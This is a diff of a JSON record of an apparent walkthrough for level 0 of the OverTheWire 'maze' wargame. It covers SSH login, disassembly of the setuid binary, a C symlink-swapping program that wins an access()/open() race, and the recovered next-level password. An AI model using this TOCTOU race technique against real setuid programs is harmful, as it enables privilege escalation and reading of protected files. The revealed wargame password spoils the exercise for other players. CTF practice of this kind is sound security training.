@@ -4,42 +4,371 @@
  "levels": [
   {
    "lvl": 0,
-   "user": "maze0",
-   "cmds": [
-    [
-     "objdump -d /maze/maze0   # main(): access(PATH,R_OK) -> setresuid(euid) -> open(PATH) -> read/print",
-     "# PATH is /tmp/128ecf542a35ac5270a87dc740918404 \u2014 a check-then-open race",
-     "printf 'AAAA...' > /tmp/real_f; ln -s /etc/maze_pass/maze1 /tmp/link_s",
-     "# C loop: rename() the path back and forth between the readable file and the symlink",
-     "for i in $(seq 15000); do /maze/maze0; done | sort | uniq -c"
-    ]
-   ],
-   "out": [
-    "AAAAAAAAAAAAAAAAAAA   (most runs)",
-    "Sp5VmLGFC0            (132 winning runs)"
-   ],
+   "user": "maze1",
    "pw": "Sp5VmLGFC0",
    "steps": [
     {
-     "cmd": "objdump -d /maze/maze0   # main(): access(PATH,R_OK) -> setresuid(euid) -> open(PATH) -> read/print"
-    },
-    {
-     "cmd": "# PATH is /tmp/128ecf542a35ac5270a87dc740918404 \u2014 a check-then-open race"
-    },
-    {
-     "cmd": "printf 'AAAA...' > /tmp/real_f; ln -s /etc/maze_pass/maze1 /tmp/link_s"
-    },
-    {
-     "cmd": "# C loop: rename() the path back and forth between the readable file and the symlink"
-    },
-    {
-     "cmd": "for i in $(seq 15000); do /maze/maze0; done | sort | uniq -c",
+     "cmd": "ssh -o StrictHostKeyChecking=accept-new maze0@maze.labs.overthewire.org -p 2225",
      "out": [
-      "AAAAAAAAAAAAAAAAAAA   (most runs)",
-      "Sp5VmLGFC0            (132 winning runs)"
+      "maze0@maze.labs.overthewire.org's password: ",
+      "",
+      "      ,----..            ,----,          .---.",
+      "     /   /   \\         ,/   .`|         /. ./|",
+      "    /   .     :      ,`   .'  :     .--'.  ' ;",
+      "   .   /   ;.  \\   ;    ;     /    /__./ \\ : |",
+      "  .   ;   /  ` ; .'___,/    ,' .--'.  '   \\' .",
+      "  ;   |  ; \\ ; | |    :     | /___/ \\ |    ' '",
+      "  |   :  | ; | ' ;    |.';  ; ;   \\  \\;      :",
+      "  .   |  ' ' ' : `----'  |  |  \\   ;  `      |",
+      "  '   ;  \\; /  |     '   :  ;   .   \\    .\\  ;",
+      "   \\   \\  ',  /      |   |  '    \\   \\   ' \\ |",
+      "    ;   :    /       '   :  |     :   '  |--\"",
+      "     \\   \\ .'        ;   |.'       \\   \\ ;",
+      "  www. `---` ver     '---' he       '---\" ire.org",
+      "",
+      "",
+      "Welcome to OverTheWire!",
+      "",
+      "If you find any problems, please report them to the #wargames channel on",
+      "discord or IRC.",
+      "",
+      "--[ Playing the games ]--",
+      "",
+      "  This machine might hold several wargames.",
+      "  If you are playing \"somegame\", then:",
+      "",
+      "    * USERNAMES are somegame0, somegame1, ...",
+      "    * Most LEVELS are stored in /somegame/.",
+      "    * PASSWORDS for each level are stored in /etc/somegame_pass/.",
+      "",
+      "  Write-access to homedirectories is disabled. It is advised to create a",
+      "  working directory with a hard-to-guess name in /tmp/.  You can use the",
+      "  command \"mktemp -d\" in order to generate a random and hard to guess",
+      "  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc",
+      "  restricted so that users cannot snoop on eachother. Files and directories",
+      "  with easily guessable or short names will be periodically deleted! The /tmp",
+      "  directory is regularly wiped.",
+      "  Please play nice:",
+      "",
+      "    * don't leave orphan processes running",
+      "    * don't leave exploit-files laying around",
+      "    * don't annoy other players",
+      "    * don't post passwords or spoilers",
+      "    * again, DONT POST SPOILERS!",
+      "      This includes writeups of your solution on your blog or website!",
+      "",
+      "--[ Tips ]--",
+      "",
+      "  This machine has a 64bit processor and many security-features enabled",
+      "  by default, although ASLR has been switched off.  The following",
+      "  compiler flags might be interesting:",
+      "",
+      "    -m32                    compile for 32bit",
+      "    -fno-stack-protector    disable ProPolice",
+      "    -Wl,-z,norelro          disable relro",
+      "",
+      "  In addition, the execstack tool can be used to flag the stack as",
+      "  executable on ELF binaries.",
+      "",
+      "  Finally, network-access is limited for most levels by a local",
+      "  firewall.",
+      "",
+      "--[ Tools ]--",
+      "",
+      " For your convenience we have installed a few useful tools which you can find",
+      " in the following locations:",
+      "",
+      "    * gef (https://github.com/hugsy/gef) in /opt/gef/",
+      "    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/",
+      "    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/",
+      "    * pwntools (https://github.com/Gallopsled/pwntools)",
+      "    * radare2 (http://www.radare.org/)",
+      "",
+      "--[ More information ]--",
+      "",
+      "  For more information regarding individual wargames, visit",
+      "  http://www.overthewire.org/wargames/",
+      "",
+      "  For support, questions or comments, contact us on discord or IRC.",
+      "",
+      "  Enjoy your stay!",
+      ""
+     ]
+    },
+    {
+     "cmd": "id",
+     "out": [
+      "uid=15000(maze0) gid=15000(maze0) groups=15000(maze0)"
+     ]
+    },
+    {
+     "cmd": "ls -la /maze/maze0",
+     "out": [
+      "-r-sr-x--- 1 maze1 maze0 13416 Oct 25 13:39 /maze/maze0"
+     ]
+    },
+    {
+     "cmd": "md5sum /maze/maze0",
+     "out": [
+      "d4a83eaed8498abf89e2c3e5e5c48257  /maze/maze0"
+     ]
+    },
+    {
+     "cmd": "objdump -d /maze/maze0 | awk '/<main>:/{f=1} f{print} /ret/{if(f)exit}'",
+     "out": [
+      "080491e6 <main>:",
+      " 80491e6:\t55                   \tpush   %ebp",
+      " 80491e7:\t89 e5                \tmov    %esp,%ebp",
+      " 80491e9:\t56                   \tpush   %esi",
+      " 80491ea:\t53                   \tpush   %ebx",
+      " 80491eb:\t83 ec 20             \tsub    $0x20,%esp",
+      " 80491ee:\t8b 45 0c             \tmov    0xc(%ebp),%eax",
+      " 80491f1:\t89 45 d8             \tmov    %eax,-0x28(%ebp)",
+      " 80491f4:\t65 a1 14 00 00 00    \tmov    %gs:0x14,%eax",
+      " 80491fa:\t89 45 f4             \tmov    %eax,-0xc(%ebp)",
+      " 80491fd:\t31 c0                \txor    %eax,%eax",
+      " 80491ff:\t6a 14                \tpush   $0x14",
+      " 8049201:\t6a 00                \tpush   $0x0",
+      " 8049203:\t8d 45 e0             \tlea    -0x20(%ebp),%eax",
+      " 8049206:\t50                   \tpush   %eax",
+      " 8049207:\te8 a4 fe ff ff       \tcall   80490b0 <memset@plt>",
+      " 804920c:\t83 c4 0c             \tadd    $0xc,%esp",
+      " 804920f:\t6a 04                \tpush   $0x4",
+      " 8049211:\t68 08 a0 04 08       \tpush   $0x804a008",
+      " 8049216:\te8 a5 fe ff ff       \tcall   80490c0 <access@plt>",
+      " 804921b:\t83 c4 08             \tadd    $0x8,%esp",
+      " 804921e:\t85 c0                \ttest   %eax,%eax",
+      " 8049220:\t75 5e                \tjne    8049280 <main+0x9a>",
+      " 8049222:\te8 49 fe ff ff       \tcall   8049070 <geteuid@plt>",
+      " 8049227:\t89 c6                \tmov    %eax,%esi",
+      " 8049229:\te8 42 fe ff ff       \tcall   8049070 <geteuid@plt>",
+      " 804922e:\t89 c3                \tmov    %eax,%ebx",
+      " 8049230:\te8 3b fe ff ff       \tcall   8049070 <geteuid@plt>",
+      " 8049235:\t56                   \tpush   %esi",
+      " 8049236:\t53                   \tpush   %ebx",
+      " 8049237:\t50                   \tpush   %eax",
+      " 8049238:\te8 f3 fd ff ff       \tcall   8049030 <setresuid@plt>",
+      " 804923d:\t83 c4 0c             \tadd    $0xc,%esp",
+      " 8049240:\t6a 00                \tpush   $0x0",
+      " 8049242:\t68 08 a0 04 08       \tpush   $0x804a008",
+      " 8049247:\te8 44 fe ff ff       \tcall   8049090 <open@plt>",
+      " 804924c:\t83 c4 08             \tadd    $0x8,%esp",
+      " 804924f:\t89 45 dc             \tmov    %eax,-0x24(%ebp)",
+      " 8049252:\t83 7d dc 00          \tcmpl   $0x0,-0x24(%ebp)",
+      " 8049256:\t79 07                \tjns    804925f <main+0x79>",
+      " 8049258:\t6a ff                \tpush   $0xffffffff",
+      " 804925a:\te8 21 fe ff ff       \tcall   8049080 <exit@plt>",
+      " 804925f:\t6a 13                \tpush   $0x13",
+      " 8049261:\t8d 45 e0             \tlea    -0x20(%ebp),%eax",
+      " 8049264:\t50                   \tpush   %eax",
+      " 8049265:\tff 75 dc             \tpush   -0x24(%ebp)",
+      " 8049268:\te8 e3 fd ff ff       \tcall   8049050 <read@plt>",
+      " 804926d:\t83 c4 0c             \tadd    $0xc,%esp",
+      " 8049270:\t6a 13                \tpush   $0x13",
+      " 8049272:\t8d 45 e0             \tlea    -0x20(%ebp),%eax",
+      " 8049275:\t50                   \tpush   %eax",
+      " 8049276:\t6a 01                \tpush   $0x1",
+      " 8049278:\te8 23 fe ff ff       \tcall   80490a0 <write@plt>",
+      " 804927d:\t83 c4 0c             \tadd    $0xc,%esp",
+      " 8049280:\tb8 00 00 00 00       \tmov    $0x0,%eax",
+      " 8049285:\t8b 55 f4             \tmov    -0xc(%ebp),%edx",
+      " 8049288:\t65 2b 15 14 00 00 00 \tsub    %gs:0x14,%edx",
+      " 804928f:\t74 05                \tje     8049296 <main+0xb0>",
+      " 8049291:\te8 ca fd ff ff       \tcall   8049060 <__stack_chk_fail@plt>",
+      " 8049296:\t8d 65 f8             \tlea    -0x8(%ebp),%esp",
+      " 8049299:\t5b                   \tpop    %ebx",
+      " 804929a:\t5e                   \tpop    %esi",
+      " 804929b:\t5d                   \tpop    %ebp",
+      " 804929c:\tc3                   \tret"
+     ]
+    },
+    {
+     "cmd": "objdump -s -j .rodata /maze/maze0 | sed -n '1,4p'",
+     "out": [
+      "",
+      "/maze/maze0:     file format elf32-i386",
+      "",
+      "Contents of section .rodata:"
+     ]
+    },
+    {
+     "cmd": "D=$(mktemp -d /tmp/l0raceXXXX) && cd $D",
+     "out": []
+    },
+    {
+     "cmd": "vi flip.c",
+     "out": [
+      "",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi flip.c",
+     "out": [
+      "#include <fcntl.h>",
+      "#include <stdio.h>",
+      "#include <unistd.h>",
+      "/* maze L0 flipper: /maze/maze0 does access(PATH,R_OK) -> setresuid(euid)",
+      " *    -> open(PATH) on the fixed path P.  The flipper keeps P swapping",
+      " *       between a plain readable filler file (passes the access check) and",
+      " *          a symlink to the next password file (open() follows the link).",
+      " *             Recreates both donors every cycle, so the swap never stalls. */",
+      "int main(void) {",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi flip.c",
+     "out": [
+      "#include <fcntl.h>",
+      "#include <stdio.h>",
+      "#include <unistd.h>",
+      "/* maze L0 flipper: /maze/maze0 does access(PATH,R_OK) -> setresuid(euid)",
+      " *    -> open(PATH) on the fixed path P.  The flipper keeps P swapping",
+      " *       between a plain readable filler file (passes the access check) and",
+      " *          a symlink to the next password file (open() follows the link).",
+      " *             Recreates both donors every cycle, so the swap never stalls. */",
+      "int main(void) {",
+      "  const char *P = \"/tmp/128ecf542a35ac5270a87dc740918404\";",
+      "  const char *A = \"/tmp/real_f\";",
+      "  const char *B = \"/tmp/link_s\";",
+      "  char filler[19] = \"AAAAAAAAAAAAAAAAAAA\";",
+      "  for (;;) {",
+      "    rename(A, P);",
+      "    rename(B, P);",
+      "    int fd = open(A, O_WRONLY|O_CREAT|O_TRUNC, 0644);",
+      "    write(fd, filler, 19);",
+      "    close(fd);",
+      "    unlink(B);",
+      "    symlink(\"/etc/maze_pass/maze1\", B);",
+      "  }",
+      "  return 0;",
+      "}",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi flip.c",
+     "out": [
+      "#include <fcntl.h>",
+      "#include <stdio.h>",
+      "#include <unistd.h>",
+      "/* maze L0 flipper: /maze/maze0 does access(PATH,R_OK) -> setresuid(euid)",
+      " *    -> open(PATH) on the fixed path P.  The flipper keeps P swapping",
+      " *       between a plain readable filler file (passes the access check) and",
+      " *          a symlink to the next password file (open() follows the link).",
+      " *             Recreates both donors every cycle, so the swap never stalls. */",
+      "int main(void) {",
+      "  const char *P = \"/tmp/128ecf542a35ac5270a87dc740918404\";",
+      "  const char *A = \"/tmp/real_f\";",
+      "  const char *B = \"/tmp/link_s\";",
+      "  char filler[19] = \"AAAAAAAAAAAAAAAAAAA\";",
+      "  for (;;) {",
+      "    rename(A, P);",
+      "    rename(B, P);",
+      "    int fd = open(A, O_WRONLY|O_CREAT|O_TRUNC, 0644);",
+      "    write(fd, filler, 19);",
+      "    close(fd);",
+      "    unlink(B);",
+      "    symlink(\"/etc/maze_pass/maze1\", B);",
+      "  }",
+      "  return 0;",
+      "}",
+      "~",
+      "\"flip.c\" [New] 25L, 837B written",
+      ""
+     ]
+    },
+    {
+     "cmd": "cat flip.c",
+     "out": [
+      "#include <fcntl.h>",
+      "#include <stdio.h>",
+      "#include <unistd.h>",
+      "/* maze L0 flipper: /maze/maze0 does access(PATH,R_OK) -> setresuid(euid)",
+      " *    -> open(PATH) on the fixed path P.  The flipper keeps P swapping",
+      " *       between a plain readable filler file (passes the access check) and",
+      " *          a symlink to the next password file (open() follows the link).",
+      " *             Recreates both donors every cycle, so the swap never stalls. */",
+      "int main(void) {",
+      "  const char *P = \"/tmp/128ecf542a35ac5270a87dc740918404\";",
+      "  const char *A = \"/tmp/real_f\";",
+      "  const char *B = \"/tmp/link_s\";",
+      "  char filler[19] = \"AAAAAAAAAAAAAAAAAAA\";",
+      "  for (;;) {",
+      "    rename(A, P);",
+      "    rename(B, P);",
+      "    int fd = open(A, O_WRONLY|O_CREAT|O_TRUNC, 0644);",
+      "    write(fd, filler, 19);",
+      "    close(fd);",
+      "    unlink(B);",
+      "    symlink(\"/etc/maze_pass/maze1\", B);",
+      "  }",
+      "  return 0;",
+      "}"
+     ]
+    },
+    {
+     "cmd": "gcc -m32 -O2 -o flip flip.c && echo BUILT",
+     "out": [
+      "flip.c: In function \u2018main\u2019:",
+      "flip.c:18:5: warning: ignoring return value of \u2018write\u2019 declared with attribute \u2018warn_unused_result\u2019 [-Wunused-result]",
+      "   18 |     write(fd, filler, 19);",
+      "      |     ^~~~~~~~~~~~~~~~~~~~~",
+      "flip.c:21:5: warning: ignoring return value of \u2018symlink\u2019 declared with attribute \u2018warn_unused_result\u2019 [-Wunused-result]",
+      "   21 |     symlink(\"/etc/maze_pass/maze1\", B);",
+      "      |     ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~",
+      "BUILT"
+     ]
+    },
+    {
+     "cmd": "printf 'AAAAAAAAAAAAAAAAAAA' > /tmp/real_f",
+     "out": []
+    },
+    {
+     "cmd": "ln -s /etc/maze_pass/maze1 /tmp/link_s",
+     "out": []
+    },
+    {
+     "cmd": "./flip &",
+     "out": [
+      "[1] 43"
+     ]
+    },
+    {
+     "cmd": "for i in $(seq 15000); do /maze/maze0; done > runs.txt 2>&1",
+     "out": []
+    },
+    {
+     "cmd": "kill %1 2>/dev/null",
+     "out": []
+    },
+    {
+     "cmd": "sort runs.txt | uniq -c | sort -rn | head -5",
+     "out": [
+      "    853 \u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000Sp5VmLGFC0",
+      "    161 \u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000AAAAAAAAAAAAAAAAAAASp5VmLGFC0",
+      "     46 \u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASp5VmLGFC0",
+      "     35 \u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASp5VmLGFC0",
+      "     20 \u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAASp5VmLGFC0",
+      "[1]+  Terminated                 ./flip"
+     ]
+    },
+    {
+     "cmd": "echo \"TOTAL=$(wc -l < runs.txt)\"",
+     "out": [
+      "TOTAL=1207"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout",
+      "Connection to maze.labs.overthewire.org closed."
      ]
     }
-   ]
+   ],
+   "note": "access()/open() TOCTOU on the fixed path P=/tmp/128ecf542a35ac5270a87dc740918404: /maze/maze0 (setuid maze1) does access(P,R_OK) as maze0, then setresuid(euid) and open(P) - the flipper (flip.c, typed in vi) rename-swaps P between a 19-char A filler file (passes the access check) and a symlink to /etc/maze_pass/maze1 (open() follows the link), recreating both donors every cycle. 15000 runs (1207 lines out, the binary is rate-limited by fork cost); the sweep output shows 853 clean Sp5VmLGFC0 plus A-prefixed variants. Password Sp5VmLGFC0 = maze1 login (verified in the maze L1+ casts). Cast: recordings/maze/L0.cast."
   },
   {
    "lvl": 1,
